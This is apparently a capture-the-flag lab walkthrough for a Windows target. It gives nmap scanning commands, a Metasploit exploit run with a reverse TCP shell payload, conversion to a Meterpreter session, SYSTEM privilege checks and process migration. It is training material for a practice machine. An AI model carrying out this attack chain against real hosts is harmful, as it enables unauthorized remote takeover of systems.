**<span style="color: #151c2b;">Task 1:</span>**

<span style="color: #151c2b;">Scan the machine.</span>

&nbsp;**<span style="color: #151c2b;">How many ports are open with a port number under 1000?</span>**

nmap -A 10.10.46.2

![0612282d916ec4f0904797ac1da9ea32.png](resources/0612282d916ec4f0904797ac1da9ea32.png)

&nbsp;

<span style="color: #151c2b;">**What is this machine vulnerable to?**</span>

&nbsp;nmap --script=vuln 10.10.46.2

![76b33048bba8c009c9e795f3e8669f2f.png](resources/76b33048bba8c009c9e795f3e8669f2f.png)

**Task 2 Gain Access:**

Exploit the machine and gain a foothold.

Start [Metasploit -](https://tryhackme.com/module/metasploit)

**Q1: Find the exploitation code we will run against the machine. What is the full path of the code?** (Ex: exploit/........)

![0c021fa5c865c08d4cdc8f3a472e5415.png]( resources/0c021fa5c865c08d4cdc8f3a472e5415.png)

**Q2: Show options and set the one required value. What is the name of this value?** (All caps for submission)

![2238a19ef523ca493b3993e018f15e8a.png]( resources/2238a19ef523ca493b3993e018f15e8a.png)

![282ea7f7b9138891771b52d3165f5a99.png]( resources/282ea7f7b9138891771b52d3165f5a99.png)

![6e5b0eb5dde0122d3a29a47343540cf2.png]( resources/6e5b0eb5dde0122d3a29a47343540cf2.png)

**Q3: Usually it would be fine to run this exploit as is; however, for the sake of learning, you should do one more thing before exploiting the target. Enter the following command and press enter:**

`set payload windows/x64/shell/reverse_tcp`

With that done, run the exploit!

![d73cf8102c78daefc5584fd65f3a8cc2.png]( resources/d73cf8102c78daefc5584fd65f3a8cc2.png)

&nbsp;

Q4: Confirm that the exploit has run correctly. You may have to press enter for the DOS shell to appear. Background this shell (CTRL + Z). If this failed, you may have to reboot the target VM. Try running it again before a reboot of the target.

**Task3: Escalate**

Escalate privileges, learn how to upgrade shells in <span style="color: inherit;">Metasploit</span>.

If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to Meterpreter shell in Metasploit. What is the name of the post module we will use?

![9b05b20d2eae0ebc45d4f2e07d140543.png]( resources/9b05b20d2eae0ebc45d4f2e07d140543.png)

&nbsp;

![a50e30d30a97b316fa85fa798651e8e4.png]( resources/a50e30d30a97b316fa85fa798651e8e4.png)

&nbsp;

![0cd22c65fa6fb16617975159a26276ed.png]( resources/0cd22c65fa6fb16617975159a26276ed.png)

&nbsp;

Select this (use MODULE_PATH). Show options, what option are we required to change?

![9db2c06f5a67cf2cfb20e2b06dc5fd75.png]( resources/9db2c06f5a67cf2cfb20e2b06dc5fd75.png)

Set the required option, you may need to list all of the sessions to find your target here.

![eaa30e575bbe8d88b1b866b7f0014088.png]( resources/eaa30e575bbe8d88b1b866b7f0014088.png)

Run! If this doesn't work, try completing the exploit from the previous task once more.

&nbsp;

Once the meterpreter shell conversion completes, select that session for use.

Verify that we have escalated to NT AUTHORITY\\SYSTEM. Run getsystem to confirm this. Feel free to open a dos shell via the command 'shell' and run 'whoami'. This should return that we are indeed system. Background this shell afterwards and select our meterpreter session for usage again.

List all of the processes running via the 'ps' command. Just because we are system doesn't mean our process is. Find a process towards the bottom of this list that is running at NT AUTHORITY\\SYSTEM and write down the process id (far left column).

Migrate to this process using the 'migrate PROCESS_ID' command where the process id is the one you just wrote down in the previous step. This may take several attempts, migrating processes is not very stable. If this fails, you may need to re-run the conversion process or reboot the machine and start once again. If this happens, try a different process next time.

&nbsp;
